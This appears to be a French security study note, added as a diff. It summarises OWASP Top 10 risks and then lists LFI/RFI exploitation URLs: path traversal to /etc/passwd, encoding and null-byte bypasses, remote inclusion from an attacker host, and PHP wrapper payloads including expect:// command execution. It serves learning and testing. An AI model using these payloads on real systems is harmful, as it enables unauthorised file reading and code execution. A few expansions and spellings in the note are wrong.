@@ -1,0 +1,120 @@
+	Chaque année OWASP publie un classement qui recence les failles de sécurité les plus critiques :
+
+
+    Injections : correspond au risque d’injection de commande (Système, SQL, Shellcode, ...)
+    ----------------------------------------------------------------------------------------
+	Comme son nom l’indique, l’injection SQL (ou SQLi) est une méthode d’exploitation de faille de sécurité d’une application possédant des interactions avec une base de données. Le principe est d’injecter, dans une requête, du code SQL malveillant qui viendra modifier l’effet escompté et ainsi compromettre l’intégrité des données présentes dans la base. Cette technique est très souvent utilisée pour contourner les mécanismes d'authentification et d'autorisation d'une application web.
+	Une faille SQLi peut avoir de lourdes conséquences car un hackeur peut avoir un accès non autorisé aux données sensibles. Il sera en mesure de lire la base de données, y enregistrer de nouvelles données ou exécuter du code malveillant. Quand on connaît la valeur et l’importance des données il serait dommageable pour un site de subir une telle cyberattaque
+
+
+    Broken Authentification and Session Management : correspond au risque de casser ou de contourner la gestion de l’authentification et de la session. (vol de session ou la récupération de mots de passe)
+    --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+    Cross-Site Scripting : correspond au XSS soit l’injection de code HTML dans une page, ce qui provoquent des actions non désirées sur une page Web.
+    --------------------------------------------------------------------------------------------------------------------------------------------------
+	Une XSS (aussi appelée Cross-Site Scripting) est une faille permettant l'injection de code (tout langage interprété par un navigateur) dans un site Web afin de modifier sa manière d'afficher. Elle provient majoritairement d'erreurs de programmation ou d'une trop grande confiance accordée aux entrées d’un utilisateur.
+	Il existe deux types de failles XSS : Reflected XSS (ou non persistante) et Stored XSS (ou persistante).
+	Une faille XSS permettrait à un individu de :
+	    _ Faire des redirections dans le but de faire du phising
+	    _ Voler des informations (Cookies, sessions, …)
+	    _ Faire des actions sur le site vulnérable et à l’insu de la victime
+
+
+    Broken Access Control : correspond aux failles de sécurité sur les droits des utilisateurs authentifiés.
+    --------------------------------------------------------------------------------------------------------
+
+
+    Security Misconfiguration : correspond aux failles liées à une mauvaise configuration des serveurs Web, applications, base de données ou framework.
+    ---------------------------------------------------------------------------------------------------------------------------------------------------
+	Les fichiers visés sont souvent des fichiers de configuration dans lesquels se trouvent des informations stratégiques pour le fonctionnement de l’application ou du site web. L’attaquant peut avoir accès à ce type de fichiers si le serveur n’est pas correctement configuré. Par exemple, si l’accès aux index n’a pas été bloqué, l’attaquant pourra aisément avoir accès aux fichiers sensibles.
+
+
+    Sensitive Data Exposure : correspond aux failles de sécurité exposant des données sensibles comme les mots de passe, les numéros de carte de paiement ou encore les données personnelles.
+    -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+    Insufficient Attack Protection : correspond à un manque de respect des bonnes pratiques de sécurité.
+    ----------------------------------------------------------------------------------------------------
+
+
+    Cross-Site Request Forgery (CSRF) : correspond aux failles liées à l’exécution de requêtes à l’insu de l’utilisateur.
+    ---------------------------------------------------------------------------------------------------------------------
+	Ce type d'attaque consiste simplement à faire exécuter à une victime une requête HTTP à son insu. Le but est de faire aller notre victime sur une page pour qu'il exécute les actions de la page, avec ses privilèges (généralement plus élevés que les nôtres).
+	    Using Components with Known Vulnerabilities : correspond aux failles liées à l’utilisation de composants tiers vulnérables.
+	   Underprotected APIs : correspond au manque de sécurité d'applications utilisant des API (Applications Programming Interface).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			##################
+			# FAILLE LFI/RFI #
+			##################
+
+    INJECTION DE PAGES/CODE PHP
+   LFI => Local File   Injection
+   RFI => Local Remote Injection
+
+
+  	     Elle permet à un utilisateur d’inclure des fichiers locaux (LFI) ou externe (RFI) à partir d’une URL.
+	     Ces fichiers peuvent très bien être en dehors du répertoire racine du site web.
+	     On peut également récupérer le code source d’une page php ou exécuter des commandes PHP à distance.
+	     Dans le pire des cas, un shell php peut être installé.
+
+Exemple d'URL de pages potentiellements vulnérables aux failles LFI/RFI
+	http://exemple.com/vulnerable.php?page=menu.php
+	http://exemple.com/vulnerable.php?page=menu
+	http://exemple.com/?menu.php
+	http://exemple.com/?page=menu
+	http://exemple.com/menu
+
+
+Exploitation :
+
+	LFI classique :
+	http://www.exemple.com/vulnerable.php?page=../../../../../../../../../../../etc/passwd
+
+	Bypass par encodage HTML ( ex: %2F => / )
+	http://www.exemple.com/vulnerable.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+	NULL BYTE : permet de terminer une chaine de caractère
+	dans le code source : include($page . ".html");
+	 si $page = menu	  =>	include(menu.html);
+	 si $page = menu.php%00   =>	include(menu.php);
+	http://www.exemple.com/vulnerable.php?page=../../../../../../../../../../../etc/passwd%00
+
+	RFI : injection de page externe
+	http://www.exemple.com/vulnerable.php?page=http://serveur-pirate.net/exploit.php
+
+	Bypass par encodage en base64 par l'utilisation du wrapper addapté
+	http://www.exemple.com/vulnerable.php?page=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==
+
+	Récupération du code source d'une page par encodage en base64 de la réponse par l'utilisation du wrapper addapté
+	http://www.exemple.com/vulnerable.php?page=php://filter/read=convert.base64-encode/resource=lfi.php
+
+	Injection de commande par l'utilisation du wrapper addapté
+	http://www.exemple.com/vulnerable.php?page=expect://ls
+
+	Injection de page dans la partie "post" de la requete WEB par l'utilisation du wrapper addapté
+	http://www.exemple.com/vulnerable.php?page=php://input
+
+
+
+
+
+
+
+
